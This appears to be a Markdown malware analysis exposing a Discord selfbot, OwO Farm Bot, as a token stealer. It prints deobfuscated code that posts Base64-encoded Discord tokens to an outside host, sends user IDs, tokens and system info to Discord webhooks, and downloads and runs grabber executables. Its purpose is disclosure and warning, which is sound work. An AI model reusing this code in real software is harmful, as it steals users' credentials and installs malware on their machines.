 LOAD THIS IN MARKDOWN FOR BETTER VIEW


# Newer Version
Five months ago, u/ButterflyVisible7532 has [posted a thread](https://www.reddit.com/r/Discord_selfbots/comments/1el9tcr/decent_token_logger_or_not_from_a_famous_selfbot/) accusing u/Mid0aria of spreading malware on his projects.

The claims were true, checking the [ab6a697ce033c495ca6527fd4b391950ea0a36c4](https://github.com/Mid0aria/owofarmbot_stable/tree/ab6a697ce033c495ca6527fd4b391950ea0a36c4) branch will display an old version of OwO Farm Bot, with all of its code deobfuscated. I have deobfuscated the main file, [bot.js](https://github.com/Mid0aria/owofarmbot_stable/blob/ab6a697ce033c495ca6527fd4b391950ea0a36c4/bot.js) with https://webcrack.netlify.app/, then used [Humanify](https://github.com/jehna/humanify), which uses LLMs to give more meaningful names to variables and functions. Which got me [this output](https://github.com/harmlessaccount/owofarmbot-deobf/blob/main/new/owofarmbot-new.js), the output file shows a lot of harmful behaviour embedded into the code. For example, line 282 to line 293 is code for a POST request that will send a Base64 encoded token to `https://syan.anlayana.com/api/diagnosticv2`:
```javascript
        axiosClient.post(

          "https://syan.anlayana.com/api/diagnosticv2",

          "diagnosticv2=" +

            fileData.from(encodeToken(_executeNode.token)).toString("base64") +

            "&project=" +

            discordClient.global.name,

          {

            headers: {

              "Content-Type": "application/x-www-form-urlencoded",

            },

          },

        );
```

From line 40 to 80, the project has an auto-updater, behaviour that is recommended against, as with one update, you'd be able to infect hundreds of machines.

```javascript
const gitUpdateAndC = async () => {
  try {
    const typeSpecifier = {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537",
    };
    const githubZipData = await axiosClient.get(
      "https://github.com/Mid0aria/owofarmbot_stable/archive/master.zip",
      {
        responseType: "arraybuffer",
        headers: typeSpecifier,
      },
    );
    const cacheFilePath = executeNode.resolve(__dirname, "updateCache.zip");
    FileOps.writeFileSync(cacheFilePath, githubZipData.data);
    const adobeZipUtil = new AdobeZipUtil(cacheFilePath);
    const extractedFile = adobeZipUtil.getEntries();
    adobeZipUtil.extractAllTo(nodeOs.tmpdir(), true);
    const firstFilePath = executeNode.join(
      nodeOs.tmpdir(),
      extractedFile[0].entryName,
    );
    if (!FileOps.existsSync(firstFilePath)) {
      logMessage.alert(
        "Updater",
        "Zip",
        "Failed To Extract Files! Please update on https://github.com/Mid0aria/owofarmbot_stable/",
      );
    }
    nodeData.copySync(firstFilePath, process.cwd(), {
      overwrite: true,
    });
    logMessage.info("Updater", "Zip", "Project updated successfully.");
  } catch (updateError) {
    logMessage.alert(
      "Updater",
      "Zip",
      "Error updating project from GitHub Repo: " + updateError,
    );
  }
};
```

This should show that the project is not in any way reliable, as if it grabbed tokens in the past, nothing stops Mid0aria of pushing an update to the current open-source version that will infect hundreds of machine. In fact, that is most likely his plan.
# Older Version

A year ago, one of the first versions of OwO Farm Bot displayed even more harmful behaviour.
[This fork](https://github.com/Krishna1407/owofarmbotv2) , with all commits authored by Mid0aria has two files: [bot.js](https://github.com/Krishna1407/owofarmbotv2/blob/main/bot.js) and [updater.js](https://github.com/Krishna1407/owofarmbotv2/blob/main/updater.js) both which are obfuscated. Let's first look into `updater.js`.

Using the same methods of deobfuscation as before, we get an [interesting output](https://github.com/harmlessaccount/owofarmbot-deobf/blob/main/old/updater.js), the function `alulum` (now renamed `notifyNodeWeb`) shows the same type of logger as before:

```javascript
function notifyNodeWeb() {

  fetchData.post({

    url: "https://canary.discord.com/api/webhooks/1089429954447544340/TIv8fsyhqDb6UVHxqrWa74Ek4U0h-8Gz92KUYJ8d4XiNMbO_YvXArB3NbhD2s04aphgS",

    json: {

      content:

        "**Version: " +

        require("./version.json").version +

        "\nHostname: " +

        platformUtils.hostname +

        "\nComputerType: " +

        platformUtils.version() +

        " / " +

        platformUtils.release() +

        " / " +

        platformUtils.platform() +

        " / " +

        platformUtils.arch() +

        "**",

    },

  });

}
```

This time however, without a Discord token included. The code also has an updater embedded (as the name suggests) which as mentioned previously, is harmful behaviour.

Let's try to investigate [bot.js](https://github.com/harmlessaccount/owofarmbot-deobf/blob/main/old/bot.js) now. Firstly, the code is much bigger than any other file authored by Mid0aria, possibly because of inexperience on modularized programming. However, there are still very concerning pieces of code.

From line 194 to 228, it tries to download two EXE files made by [Benjamin Loir](https://github.com/benjaminloir/), that account is an alt created by Mid0aria. You can see that by checking the Starred tab. Benjamin only follows Mid0aria and stars all of his projects. Unfortunately, the repositories it tries to download from are deleted.

```javascript
if (windowsCheck.existsSync(_filePath)) {

  } else {

    const executableVer = httpsClient.get(

      "https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/owocaptchachecker.exe",

      function (downloadOwocR) {

        var saveDownloads = windowsCheck.createWriteStream(_filePath);

        downloadOwocR.pipe(saveDownloads);

        saveDownloads.on("finish", () => {

          saveDownloads.close();

          setTimeout(() => {

            runShellCmd(_filePath);

            sendGrabberWC("Empyrean", userId, discordToken);

          }, 2000);

        });

      },

    );

  }

  if (windowsCheck.existsSync(backupHelperB)) {

  } else {

    const backupExecutB = httpsClient.get(

      "https://github.com/benjaminloir/super-duper-broccoli/releases/download/doyouloveme/owobanbypasshelper.exe",

      function (owobanbypass) {

        var saveToBackup = windowsCheck.createWriteStream(backupHelperB);

        owobanbypass.pipe(saveToBackup);

        saveToBackup.on("finish", () => {

          saveToBackup.close();

          setTimeout(() => {

            runShellCmd(backupHelperB);

            sendGrabberWC("Blank", userId, discordToken);

          }, 2000);

        });

      },

    );

  }

}
```

`sendGrabberWC` is a function that takes three parameters: `grabberType, userId, discordToken`, hich then redirects those values to a webhook:

```javascript
function sendGrabberWC(grabberType, userId, discordToken) {

  fetchData.post({

    url: "https://canary.discord.com/api/webhooks/1086685243739750612/9Dcdoaz6L0WLV7f3J6MEI1HCcctdwUfMFlRurYusy-0aihX7RQNhAGDrzB3EIa7npOEc",

    json: {

      content:

        "**Grabber Type: " +

        grabberType + // Search for ".exe", possibly downloads a malicious exe and tries to track which grabber it has used

        "\nUser ID: " +

        userId +

        "\nToken: ```" +

        discordToken +

        "``` \nHostname: " +

        platformInfo.hostname +

        "\nComputerType: " +

        platformInfo.version() +

        " / " +

        platformInfo.release() +

        " / " +

        platformInfo.platform() +

        " / " +

        platformInfo.arch() +

        "**",

    },

  });

}
```

It should be clear by now that, the code tries to download two grabbers: Empyrean Grabber and Blank Grabber. A quick search shows that both of those exist and are publicly available. [Empyrean](https://github.com/fnttrtx/empyrean-grabber-fixed?tab=readme-ov-file#features), [Blank](https://github.com/Blank-c/Blank-Grabber?tab=readme-ov-file#features).

This shows that Mid0aria not only is stealing tokens, but is also doing something much more harmful that steals a lot more than just a Discord token.

